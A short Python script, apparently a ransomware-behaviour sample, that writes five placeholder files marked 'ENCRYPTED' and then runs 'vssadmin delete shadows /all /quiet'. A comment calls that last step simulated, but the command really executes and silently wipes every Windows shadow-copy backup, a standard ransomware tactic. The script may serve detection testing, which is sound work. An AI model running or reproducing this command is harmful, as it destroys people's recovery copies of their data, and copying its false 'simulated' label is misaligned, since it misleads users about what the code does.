import os

# Write to a bunch of files
for i in range(5):
    with open(f"encrypted_{i}.txt", "w") as f:
        f.write("ENCRYPTED")
        
# Execute vssadmin to delete shadow copies (simulated)
os.system("vssadmin delete shadows /all /quiet")
